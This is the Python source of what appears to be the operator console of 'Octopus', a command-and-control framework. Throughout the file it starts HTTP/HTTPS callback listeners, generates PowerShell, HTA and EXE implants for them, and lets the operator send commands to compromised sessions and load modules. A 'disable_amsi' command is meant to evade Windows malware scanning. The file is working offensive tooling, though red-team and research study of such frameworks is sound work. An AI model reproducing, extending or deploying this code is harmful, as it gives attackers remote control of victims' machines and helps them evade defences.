#!/usr/bin/python2.7

import threading
import readline
import time
import base64
import sys
import os
import signal
from termcolor import colored
from core.functions import *
from core.weblistener import *
from flask import *
import logging


def ctrlc(sig, frame):
    pass

signal.signal(signal.SIGINT, ctrlc)
if not os.path.isfile(".oct_history"):
    open('.oct_history', 'a').close()
else:
    readline.read_history_file(".oct_history")

banner()

while True:
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    readline.write_history_file(".oct_history")
    command = raw_input("\033[4mOctopus\033[0m"+colored(" >>", "green"))
    # readline.write_history_file(".console_history.oct")
    if command == "list":
        list_sessions()

    if command == "history":
            get_history()

    if command == "help":
        main_help_banner()

    if command == "generate_hta":
        generate_hta(ip, port, path)

    if command == "listeners":
        list_listeners()

    if command.split(" ")[0] == "delete":
        try:
            session = connections_information[int(command.split(" ")[1])]
            delete(session[2], int(command.split(" ")[1]))
        except (KeyError, ValueError):
            print colored("[-] Wrong listener selected !", "red")
            continue

    # delete_listener

    # TBD
    # if command.split(" ")[0] == "delete_listener":
    #    listener = listeners_information[int(command.split(" ")[1])]
    #    delete(listener[0], int(command.split(" ")[1]))

    if command == "clear":
        os.system("clear")

    if command == "exit":
        exit()

    if command.split(" ")[0] == "generate_powershell":
        try:
            listener = command.split(" ")[1]
        except IndexError:
            print colored("[-] Please select a listener !", "red")
            print colored("Syntax :  generate_powershell listener_name", "green")
            print colored("Example : generate_powershell listener1", "yellow")
            continue

        try:
            hostname = listeners_information[listener][3]+":"+listeners_information[listener][2]
            interval = listeners_information[listener][4]
            path = listeners_information[listener][5]
            proto = listeners_information[listener][6]

            # check if protocol is True then https is used
            if proto:
                proto_to_use = "https"
            else:
                proto_to_use = "http"

            generate(hostname, path, proto_to_use, interval)
        except KeyError:
            print colored("[-] Wrong listener selected !", "red")
            continue

    if command.split(" ")[0] == "generate_exe":
        try:
            listener = command.split(" ")[1]
            exe_path = command.split(" ")[2]
        except IndexError:
            print colored("[-] Please select a listener and check your options !", "red")
            print colored("Syntax :  generate_exe listener_name output_path", "green")
            print colored("Example : generate_exe listener1 /opt/Octopus/file.exe", "yellow")
            continue

        try:
            hostname = listeners_information[listener][3]+":"+listeners_information[listener][2]
            path = listeners_information[listener][5]
            proto = listeners_information[listener][6]

            # check if protocol is True then https is used
            if proto:
                proto_to_use = "https"
            else:
                proto_to_use = "http"

            generate_exe(hostname, path, proto_to_use, exe_path)
        except KeyError:
            print colored("[-] Wrong listener selected !", "red")
            continue


    if command.split(" ")[0] == "interact":
            readline.set_completer(completer_interact)
            readline.parse_and_bind("tab: complete")

            try:
                session = connections_information[int(command.split(" ")[1])]
            except:
                print colored("[-] Error interacting with host", "red")
                continue
            while True:
                scommand = raw_input("(%s) >> " % colored(session[2], "red"))
                if scommand == "":
                    continue
                elif scommand == "exit" or scommand == "back":
                    break
                elif scommand == "help":
                    interact_help()
                elif scommand == "kill":
                    kill(session[2])
                elif scommand == "clear":
                    os.system("clear")

                elif scommand == "upload":
                    # call upload function
                    pass

                elif scommand == "modules":
                    list_modules()
                    pass
                elif scommand.split(" ")[0] == "load":
                    try:
                        module_name = scommand.split(" ")[1]
                        load_module(session[2], module_name)
                        pass
                    except IndexError:
                        print colored("[+] Please select a module !")
                elif scommand == "disable_amsi":
                    disable_amsi(session[2])
                    pass
                else:
                    send_command(session[2], scommand)
    elif command.split(" ")[0] == "listen_http":
        try:
            # create new listeners for
            ip = command.split(" ")[1]
            try:
                port = int(command.split(" ")[2])
            except ValueError:
                print colored("[-] port should be number !", "red")
                continue
            host = command.split(" ")[3]
            try:
                interval = int(command.split(" ")[4])
            except ValueError:
                print colored("[-] interval should be number !", "red")
                continue
            path = command.split(" ")[5]
            listener_name = command.split(" ")[6]
            if check_listener_name(listener_name):
                if check_url(path):
                    listener = NewListener(
                        listener_name,
                        ip,
                        port,
                        host,
                        interval,
                        path
                        )
                    listener.start_listener()
                    listener.create_path()
                    print colored("[+]%s Listener has been created" % listener_name, "green")
                else:
                    print colored("[-] URL name already used, please change it", "red")
            else:
                print colored("[-] Listener name already used, please change it", "red")

        except IndexError:
            print colored("[-] Please check listener arguments !", "red")
            print colored("Syntax  : listen_http BindIP BindPort hostname interval URL listener_name", "green")
            print colored("Example (with domain) : listen_http 0.0.0.0 8080 myc2.live 5 comments.php op1_listener", "yellow")
            print colored("Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_listener", "yellow")
            http_help_banner()

            continue

    elif command.split(" ")[0] == "listen_https":
        try:
            # create new listeners for
            ip = command.split(" ")[1]
            try:
                port = int(command.split(" ")[2])
            except ValueError:
                print colored("[-] port should be number !", "red")
                continue
            host = command.split(" ")[3]
            try:
                interval = int(command.split(" ")[4])
            except ValueError:
                print colored("[-] interval should be number !", "red")
                continue
            path = command.split(" ")[5]
            listener_name = command.split(" ")[6]
            if check_listener_name(listener_name):
                key_path = command.split(" ")[7]
                cert_path = command.split(" ")[8]
                if not os.path.isfile(cert_path) or not os.path.isfile(key_path):
                    print colored("[-] Please check the certficate and key path", "red")
                elif listener_name in listeners_information.keys():
                    print colored("[-] Listener name already used, please change it", "red")
                else:
                    listener = NewListener(
                        listener_name,
                        ip,
                        port,
                        host,
                        interval,
                        path,
                        cert_path,
                        key_path
                    )
                    listener.start_listener()
                    listener.create_path()
                    print colored("[+]%s Listener has been created" % listener_name, "green")
            else:
                print colored("[-] URL name already used, please change it", "red")

        except IndexError:
            print colored("[-] Please check listener arguments !", "red")
            print colored("Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path", "green")
            print colored("Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem", "yellow")
            continue
